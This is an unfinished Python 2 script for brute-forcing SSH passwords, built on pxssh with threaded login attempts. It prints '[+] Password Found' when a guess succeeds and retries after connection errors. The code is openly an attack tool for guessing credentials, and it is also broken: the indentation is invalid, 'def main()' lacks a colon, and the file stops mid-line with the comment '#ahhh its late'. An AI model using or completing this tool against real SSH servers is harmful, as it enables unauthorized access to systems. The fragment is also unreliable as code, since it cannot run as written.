import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
    Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
        Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
    if release: connection_lock.release()

def main()
    parser = optparse.Option

#ahhh its late
